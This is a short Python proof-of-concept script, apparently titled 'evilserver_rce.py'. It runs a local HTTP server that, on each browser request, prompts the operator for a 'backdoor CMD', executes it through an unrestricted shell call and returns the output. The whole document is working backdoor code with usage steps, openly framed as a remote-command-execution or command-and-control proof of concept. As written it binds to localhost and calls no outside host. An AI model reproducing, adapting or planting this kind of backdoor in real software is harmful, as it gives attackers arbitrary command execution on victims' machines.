# POC Usage:

# *Replace PORT with your desired PORT #

# 1. Run the server: `python3 evilserver_rce.py PORT`

# 2. Run the client: `curl localhost:PORT`

# 3. Go to localhost:PORT in your browser

# 4. Check your evil server terminal and it should ask for a backdoor CMD to execute

# 5. In the browser, you should be able to see the results of your backdoor CMD


import subprocess
import http.server, os, sys

HOST = "127.0.0.1"
PORT = int(sys.argv[1])

class HTTP_handler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):
        c2cmd = input('[backdoorCMD] ')
        if c2cmd.strip() == 'exit':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"Exiting backdoor...")
            sys.exit(0)
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        output = self.execute_command(c2cmd)
        self.wfile.write(output)

    def execute_command(self, command):
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            return result.encode()
        except subprocess.CalledProcessError as e:
            return f"Error: {e.returncode}\n{e.output}".encode()

if __name__ == "__main__":
    server_class = http.server.HTTPServer
    print("Starting server on localhost:" + str(PORT))
    httpd = server_class((HOST, PORT), HTTP_handler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Stopping server")
